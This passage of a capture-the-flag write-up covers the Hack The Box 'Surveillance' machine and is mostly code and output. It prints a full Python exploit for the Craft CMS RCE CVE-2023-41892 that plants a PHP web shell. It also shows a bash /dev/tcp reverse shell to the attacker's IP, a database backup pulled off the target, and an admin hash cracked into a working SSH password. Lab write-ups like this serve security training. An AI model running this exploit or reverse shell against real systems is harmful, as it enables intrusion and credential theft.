</span></span></code></pre></div><ul><li>Then in <a href=https://gist.github.com/zhsh9/ae0d6093640aa5c82c534ebee80fa1df class=external-link target=_blank rel=noopener>this Github post</a>, and also in <a href=https://threatprotect.qualys.com/2023/09/25/craft-cms-remote-code-execution-vulnerability-cve-2023-41892/ class=external-link target=_blank rel=noopener>this post</a>, they show another PoC, but in one of the figures they also use a <code>proxy</code> with <code>Burpsuite</code> to make it work:
<img alt=Surveillance_4.png src=/pentesting/images/Surveillance_4.png></li><li>To fix this, in every line in the script where the variable <code>response</code> is set, we have to add a proxy to <code>htttp://127.0.0.1:8080</code>. <code>Burpsuite</code>, by default, intercepts requests on port <code>8080</code> in our machine. So adding this we will be sending the requests made by the <code>Python</code> script through <code>Burpsuite</code>. For this I change the lines that says, for example:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/shell.php&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;cmd&#34;</span><span class=p>:</span> <span class=n>cmd</span><span class=p>})</span>
</span></span></code></pre></div><p>to</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/shell.php&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;cmd&#34;</span><span class=p>:</span> <span class=n>cmd</span><span class=p>},</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>,</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>
</span></span></code></pre></div><p>We repeat this for every <code>response.get</code> and <code>response.post</code> variables.</p><ul><li>The final modified code to work along with <code>Burpsuite</code> looks then like:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>writePayloadToTempFile</span><span class=p>(</span><span class=n>documentRoot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;Imagick&#34;, &#34;__construct()&#34;:{&#34;files&#34;:&#34;msl:/etc/passwd&#34;}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>files</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;image1&#34;</span><span class=p>:</span> <span class=p>(</span><span class=s2>&#34;pwn1.msl&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;image&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;read filename=&#34;caption:&amp;lt;?php @system(@$_REQUEST[&#39;cmd&#39;]); ?&amp;gt;&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;write filename=&#34;info:DOCUMENTROOT/cpresources/shell.php&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;/image&gt;&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;DOCUMENTROOT&#34;</span><span class=p>,</span> <span class=n>documentRoot</span><span class=p>),</span> <span class=s2>&#34;text/plain&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getTmpUploadDirAndDocumentRoot</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=sa>r</span><span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;</span><span class=se>\\</span><span class=s1>GuzzleHttp</span><span class=se>\\</span><span class=s1>Psr7</span><span class=se>\\</span><span class=s1>FnStream&#34;, &#34;__construct()&#34;:{&#34;methods&#34;:{&#34;close&#34;:&#34;phpinfo&#34;}}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pattern1</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;&lt;tr&gt;&lt;td class=&#34;e&#34;&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;(.*?)&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>pattern2</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;&lt;tr&gt;&lt;td class=&#34;e&#34;&gt;\$_SERVER\[</span><span class=se>\&#39;</span><span class=s1>DOCUMENT_ROOT</span><span class=se>\&#39;</span><span class=s1>\]&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;([^&lt;]+)&lt;\/td&gt;&lt;\/tr&gt;&#39;</span>
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>    <span class=n>match1</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern1</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>match2</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern2</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>match1</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span> <span class=n>match2</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>trigerImagick</span><span class=p>(</span><span class=n>tmpDir</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;Imagick&#34;, &#34;__construct()&#34;:{&#34;files&#34;:&#34;vid:msl:&#39;</span> <span class=o>+</span> <span class=n>tmpDir</span> <span class=o>+</span> <span class=sa>r</span><span class=s1>&#39;/php*&#34;}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>shell</span><span class=p>(</span><span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>base_url</span> <span class=o>+</span> <span class=s2>&#34;/cpresources/shell.php&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;cmd&#34;</span><span class=p>:</span> <span class=n>cmd</span><span class=p>},</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;caption:(.*?)CAPTION&#39;</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>extracted_text</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>extracted_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>extracted_text</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: python CVE-2023-41892.py &lt;url&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>base_url</span> <span class=o>=</span> <span class=s1>&#39;http://surveillance.htb&#39;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Get temporary folder and document root ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>upload_tmp_dir</span><span class=p>,</span> <span class=n>documentRoot</span> <span class=o>=</span> <span class=n>getTmpUploadDirAndDocumentRoot</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>tmpDir</span> <span class=o>=</span> <span class=s2>&#34;/tmp&#34;</span> <span class=k>if</span> <span class=s2>&#34;no value&#34;</span> <span class=ow>in</span> <span class=n>upload_tmp_dir</span> <span class=k>else</span> <span class=n>upload_tmp_dir</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Write payload to temporary file ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>writePayloadToTempFile</span><span class=p>(</span><span class=n>documentRoot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>ConnectionError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Crash the php process and write temp file successfully&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Trigger imagick to write shell ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>trigerImagick</span><span class=p>(</span><span class=n>tmpDir</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Done, enjoy the shell&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>cmd</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;$ &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>shell</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
</span></span></code></pre></div><ul><li>Before re-running the modified script, start a <code>Burpsuite</code> and go to <code>Proxy -> Intercept -> Intercept On</code>. First, I tried this against <code>http://surveillance.htb/admin/login</code> page, since <code>Craft CMS</code> was exposed on that page. If I run the script:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE_2023_41892_modified.py http://surveillance.htb/admin/login
</span></span></span></code></pre></div><p>I can see that <code>Burpsuite</code> successfully intercepts the request through the modified <code>python3</code> script:
<img alt=Surveillance_5.png src=/pentesting/images/Surveillance_5.png>
and, after this, is just click on <code>Forward</code> as the script makes the requests.</p><ul><li>However, when I run this I notice that my script did not work:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE_2023_41892_modified.py http://surveillance.htb/admin/login
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] Get temporary folder and document root ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Write payload to temporary file ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Trigger imagick to write shell ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Done, enjoy the shell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> id
</span></span><span class=line><span class=cl><span class=gp>$</span>
</span></span></code></pre></div><ul><li>If I check <code>Burpsuite</code> history (<code>Proxy -> Intercept -> HTTP History</code>) I notice that we have a code <code>502 Bad Gateway</code>, i.e., we are trying a <code>POST</code> request against an endpoint that does not exist.
<img alt=Surveillance_6.png src=/pentesting/images/Surveillance_6.png></li><li>So, instead of <code>http://surveillance.htb/admin/login</code> I just try against the url <code>http://surveillance.htb</code> and now it works:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE_2023_41892_modified.py http://surveillance.htb/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] Get temporary folder and document root ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Write payload to temporary file ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Trigger imagick to write shell ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Done, enjoy the shell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> id
</span></span><span class=line><span class=cl><span class=go>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></span></code></pre></div><ul><li>I start a <code>nc</code> listener on port <code>443</code> and, then, in the obtained shell I run the command <code>bash -c 'bash -i &> /dev/tcp/10.10.16.6/443 0>&amp;1'</code>, so it looks like:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE_2023_41892_modified.py http://surveillance.htb/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] Get temporary folder and document root ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Write payload to temporary file ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Trigger imagick to write shell ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Done, enjoy the shell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> id
</span></span><span class=line><span class=cl><span class=go>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> bash -c <span class=s1>&#39;bash -i &amp;&gt; /dev/tcp/10.10.16.6/443 0&gt;&amp;1&#39;</span>
</span></span></code></pre></div><p>and in my <code>nc</code> listener I get a reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.245] 44376
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (1086): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>www-data@surveillance:~/html/craft/web/cpresources$ whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>www-data
</span></span></span></code></pre></div><ul><li>Once inside the machine as <code>www-data</code> I can see two users, <code>matthew</code> and <code>zoneminder</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@surveillance:~/html/craft/web/cpresources$ ls /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>matthew  zoneminder
</span></span></span></code></pre></div><ul><li>If I search for files that have the word <code>back</code> (for <code>backup</code>) at <code>/var/www/html/craft</code> I can see some:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@surveillance:~/html/craft$ find . -name &#34;*back*&#34; 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>./storage/backups
</span></span></span><span class=line><span class=cl><span class=go>./vendor/cebe/markdown/tests/markdown-data/md1_backslash_escapes.md
</span></span></span><span class=line><span class=cl><span class=go>./vendor/cebe/markdown/tests/markdown-data/md1_backslash_escapes.html
</span></span></span><span class=line><span class=cl><span class=go>./vendor/voku/arrayy/src/TypeCheck/TypeCheckCallback.php
</span></span></span><span class=line><span class=cl><span class=go>./vendor/voku/anti-xss/src/voku/helper/data/entities_fallback.php
</span></span></span><span class=line><span class=cl><span class=go>./vendor/nette/utils/src/Utils/Callback.php
</span></span></span><span class=line><span class=cl><span class=go>./vendor/craftcms/cms/src/templates/plugin-store/_special/oauth/callback.twig
</span></span></span><span class=line><span class=cl><span class=go>./vendor/craftcms/cms/src/templates/plugin-store/_special/oauth/modal-callback.twig
</span></span></span><span class=line><span class=cl><span class=go>./vendor/craftcms/cms/src/web/assets/dbbackup
</span></span></span><span class=line><span class=cl><span class=go>./vendor/craftcms/cms/src/web/twig/nodes/FallbackNameExpression.php
</span></span></span><span class=line><span class=cl><span class=go>./vendor/craftcms/cms/src/imagetransforms/FallbackTransformer.php
</span></span></span><span class=line><span class=cl><span class=go>./vendor/yiisoft/yii2-debug/src/assets/scss/bs-4.3.1/utilities/_background.scss
</span></span></span><span class=line><span class=cl><span class=go>./vendor/yiisoft/yii2-debug/src/assets/scss/bs-4.3.1/mixins/_background-variant.scss
</span></span></span><span class=line><span class=cl><span class=go>./vendor/monolog/monolog/src/Monolog/Handler/FallbackGroupHandler.php
</span></span></span></code></pre></div><ul><li>So there is a directory <code>/var/www/html/craft/storage/backups</code> that looks interesting. Inside this directory I check what is its content:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@surveillance:~/html/craft/storage/backups$ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 28
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x 2 www-data www-data  4096 Oct 17  2023 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 6 www-data www-data  4096 Oct 11  2023 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 root     root     19918 Oct 17  2023 surveillance--2023-10-17-202801--v4.4.14.sql.zip
</span></span></span></code></pre></div><ul><li>Since the victim server has <code>python3</code> installed I will start a temporal <code>Python</code> <code>HTTP</code> server on port <code>8000</code> of the victim machine, expose the backup and then download it. So in the target machine I run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@surveillance:~/html/craft/storage/backups$ python3 -m http.server 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</span></span></span></code></pre></div><p>and pass it to my machine running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wget http://surveillance.htb:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-04-18 20:12:54--  http://surveillance.htb:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip
</span></span></span><span class=line><span class=cl><span class=go>Resolving surveillance.htb (surveillance.htb)... 10.10.11.245
</span></span></span><span class=line><span class=cl><span class=go>Connecting to surveillance.htb (surveillance.htb)|10.10.11.245|:8000... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 19918 (19K) [application/zip]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äòsurveillance--2023-10-17-202801--v4.4.14.sql.zip‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>surveillance--2023-10-17-202801--v4.4.14.s 100%[=======================================================================================&gt;]  19.45K  75.1KB/s    in 0.3s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024-04-18 20:12:54 (75.1 KB/s) - ‚Äòsurveillance--2023-10-17-202801--v4.4.14.sql.zip‚Äô saved [19918/19918]
</span></span></span></code></pre></div><ul><li>Then, on my machine, I just read this file with <code>cat</code> and there is a lot of output. But there is one line that calls my attention:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat surveillance--2023-10-17-202801--v4.4.14.sql | grep -i &#34;matthew&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>INSERT INTO `searchindex` VALUES (1,&#39;email&#39;,0,1,&#39; admin surveillance htb &#39;),(1,&#39;firstname&#39;,0,1,&#39; matthew &#39;),(1,&#39;fullname&#39;,0,1,&#39; matthew b &#39;),(1,&#39;lastname&#39;,0,1,&#39; b &#39;),(1,&#39;slug&#39;,0,1,&#39;&#39;),(1,&#39;username&#39;,0,1,&#39; admin &#39;),(2,&#39;slug&#39;,0,1,&#39; home &#39;),(2,&#39;title&#39;,0,1,&#39; home &#39;),(7,&#39;slug&#39;,0,1,&#39; coming soon &#39;),(7,&#39;title&#39;,0,1,&#39; coming soon &#39;);
</span></span></span><span class=line><span class=cl><span class=go>INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,&#39;admin&#39;,&#39;Matthew B&#39;,&#39;Matthew&#39;,&#39;B&#39;,&#39;admin@surveillance.htb&#39;,&#39;39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec&#39;,&#39;2023-10-17 20:22:34&#39;,NULL,NULL,NULL,&#39;2023-10-11 18:58:57&#39;,NULL,1,NULL,NULL,NULL,0,&#39;2023-10-17 20:27:46&#39;,&#39;2023-10-11 17:57:16&#39;,&#39;2023-10-17 20:27:46&#39;);
</span></span></span></code></pre></div><p><code>39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec</code> looks like a hash.</p><ul><li>I save this hash and pass it to <code>Crackstation</code> (<a href=https://crackstation.net/ class=external-link target=_blank rel=noopener>https://crackstation.net/</a>) to attempt a <code>Brute Force Password Cracking</code>:
<img alt=Surveillance_7.png src=/pentesting/images/Surveillance_7.png>
and we find a password: <code>starcraft122490</code></li><li>I check with <code>NetExec</code> if I have access to <code>matthew</code> user via <code>SSH</code> and we do:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec ssh 10.10.11.245 -u &#39;matthew&#39; -p &#39;starcraft122490&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SSH         10.10.11.245    22     10.10.11.245     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.245    22     10.10.11.245     [+] matthew:starcraft122490  (non root) Linux - Shell access!
</span></span></span></code></pre></div><p>So we can access via <code>SSH</code> with credentials <code>matthew:starcraft122490</code>, where we can get the flag at <code>matthew</code> home.</p><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
